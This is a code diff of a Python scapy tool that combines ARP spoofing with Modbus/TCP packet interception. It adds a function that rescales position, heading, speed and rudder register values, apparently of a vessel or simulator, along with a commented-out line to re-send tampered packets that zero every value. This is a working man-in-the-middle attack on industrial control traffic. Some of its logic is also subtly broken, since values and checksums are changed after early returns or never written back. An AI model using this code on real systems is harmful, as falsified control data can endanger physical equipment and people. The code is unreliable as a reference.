@@ -9,19 +9,50 @@ from scapy.contrib.modbus import *
  
 class packet_sniffing:
 
-    def modify(pkt):
+    # Modify packets according to inputs: mult & offset: default to 1x mult, +0 offset
+    def modify(pkt, matrix = [[1,0], [1,0], [1,0], [1,0], [1,0]]):
         if (not pkt.haslayer(ModbusADURequest) and not pkt.haslayer(ModbusADUResponse)):
-            return "Not Modbus Layer"
+            return pkt
         modbus_layer = pkt.getlayer(ModbusADURequest) or pkt.getlayer(ModbusADUResponse)
-
+        pdu = getattr(modbus_layer, "payload", "?")
+        
         # Response: speed & rudder: alter this
-        if pkt.haslayer(ModbusADUResponse) and getattr(modbus_layer, "funcCode", "?") == 3:
+        if pkt.haslayer(ModbusADUResponse) and getattr(pdu, "funcCode", "?") == 3:
+            register_value = getattr(pdu, "registerVal", "?")
+            if register_value == "?":
+                return pkt
+            register_value[0] = int(register_value[0])*matrix[3][0] + matrix[3][1]
+            register_value[1] = int(register_value[1])*matrix[4][0] + matrix[4][1]
             return pkt
-        if pkt.haslayer(ModbusADUResponse) and getattr(modbus_layer, "funcCode", "?") == 6:
-            return pkt
+
         # Position data: alter based on register addr
         if getattr(modbus_layer, "funcCode", "?") == 6:
+            register_addr = getattr(pdu, "registerAddr", "?")
+            register_value = getattr(pdu, "registerValue", "?")
+            if register_addr == "?" or register_value == "?":
+                return pkt
+            # X
+            if register_addr == 10:
+                register_value = int(register_value)*matrix[0][0] + matrix[0][1]
+            # Y
+            elif register_addr == 11:
+                register_value = int(register_value)*matrix[1][0] + matrix[1][1]
+            # Theta
+            elif register_addr == 12:
+                register_value = int(register_value)*matrix[2][0] + matrix[2][1]
             return pkt
+            
+        
+        # Recalculate fields
+        if pkt.haslayer(ModbusADURequest):
+            del pkt[ModbusADURequest].len
+        if pkt.haslayer(ModbusADUResponse):
+            del pkt[ModbusADUResponse].len
+
+        del pkt[TCP].chksum
+
+        return pkt
+        
         
 
     def get_packet_info(pkt):
@@ -173,15 +204,10 @@ class packet_sniffing:
             # Modbus/TCP runs over TCP port 502
             if pkt.haslayer(TCP) and (pkt[TCP].sport == 502 or pkt[TCP].dport == 502):
                 if (pkt.haslayer(ModbusADURequest) or pkt.haslayer(ModbusADUResponse)):
-                    print(packet_sniffing.get_packet_info(pkt)["scan_numbers"]) #Scannable numbers in order: X Y Theta Speed Rudder
+                    print(packet_sniffing.get_packet_info(pkt)["scan_numbers"])     #Scannable numbers in order: X Y Theta Speed Rudder
                     # print(packet_sniffing.get_packet_info(pkt)["modbus_summary"]) # Detailed lines
-                    # pkt[scapy.IP].ttl -= 1
-                    # del pkt[scapy.IP].chksum
-                    # del pkt[scapy.TCP].chksum
-
-                    # pkt = packet_sniffing.modify(pkt)
-
-                    # scapy.send(pkt, verbose=False)
+            
+                    # scapy.send(packet_sniffing.modify(pkt, [[0,0], [0,0], [0,0], [0,0], [0,0]]), verbose=False)
                 else:
                     print("not modbus")
                     # pkt[ModbusADUResponse].show()
@@ -252,7 +278,8 @@ class arp_spoofing:
         #gateway ip
         arp_spoofing.host = '192.168.8.243'
 
-        arp_spoofing.verbose = True
+        # True = print, False = no print
+        arp_spoofing.verbose = False
 
         def interval():
             if arp_spoofing.running:
